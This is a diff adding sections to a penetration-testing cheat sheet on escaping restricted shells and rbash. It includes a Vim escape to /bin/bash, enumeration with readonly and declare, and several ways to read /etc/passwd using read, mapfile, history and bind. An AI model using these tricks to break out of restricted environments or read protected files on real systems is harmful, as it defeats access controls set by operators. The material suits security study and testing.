@@ -18,5 +18,65 @@ To escape of restricted shells, we can try to use command substitution (ex: <cod
 Common tricks:
 
 * **List files**: `echo /*` and `echo /.*`
-* **Read files**: `read f < /etc/passwd; echo $f`
+* **Read a file**: `read f < /etc/passwd; echo $f`
+* **Read a file**: `f=$(</etc/passwd); echo $f`
+
+If you can run commands, refer to [GTFOBins](../tools/gtfobins.md) or their manual. For VIM:
+
+```ruby!
+:set shell=/bin/bash
+:shell
+```
+</div></div>
+
+<hr class="sep-both">
+
+## Restricted Bash (rbash)
+
+<div class="row row-cols-lg-2"><div>
+
+#### Enumeration
+
+The `readonly` command is useful to list which variable you can't edit.
+
+```shell!
+$ readonly
+ENV
+PATH
+HOME
+```
+
+You can use `declare` to get information about your environment.
+
+```shell!
+$ declare -x # remove -x to see functions
+BASH_VERSINFO=([0]="4" [1]="4" [2]="20" [3]="1" [4]="release" [5]="i686-pc-linux-gnu")
+BASH_VERSION='4.4.20(1)-release'
+PATH=/tmp/void/
+SHELLOPTS=braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor
+```
+</div><div>
+
+#### Read a file
+
+Method using `mapfile`:
+
+```shell!
+$ mapfile array < /etc/passwd
+$ echo ${array[@]}
+```
+
+Method using `history`:
+
+```shell!
+$ export HISTFILE=/etc/passwd
+$ history -r
+$ history
+```
+
+Method using `bind`:
+
+```shell!
+$ bind -f /etc/passwd
+```
 </div></div>
